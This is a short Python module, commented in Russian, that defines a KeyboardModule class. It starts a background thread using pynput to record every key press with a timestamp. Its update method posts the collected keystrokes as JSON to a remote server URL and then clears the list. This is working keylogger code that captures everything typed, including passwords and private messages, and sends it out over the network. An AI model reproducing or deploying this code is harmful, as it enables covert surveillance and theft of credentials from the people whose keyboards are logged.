from threading import Thread
from pynput.keyboard import Listener
from time import time, sleep
from . import BaseModule
from requests import post
from logging import info


class KeyboardModule(BaseModule):
    key_events = []

    def __init__(self):
        super().__init__(name='keyboard')

        # Создаем поток для трекинга нажатий на клавиатуру
        # передаем в функцию массив нажатых клавиш
        keys_thread = Thread(target=self.key_tracking, args=(self.key_events, ))
        keys_thread.start()

    @staticmethod
    def key_tracking(key_events):
        # Метод обрабатывающий нажатие клавиш
        # при получении события нажатия на кнопку добавляем данные в массив
        with Listener(on_press=lambda key: key_events.append({'time': time(), 'button': f'{key}'})) as listener:
            listener.join()

    def update(self):
        # Метод отправки данных на сервер
        try:
            post(self.url, json={'id': 0, 'source': 101, 'value': self.key_events})
            info(f'Отправлены данные: {self.key_events}')
        except Exception as exception:
            info(f'Возникла проблема при подключению: {exception}')
        self.key_events.clear()  # Отчищаем массив нажатых клавиш
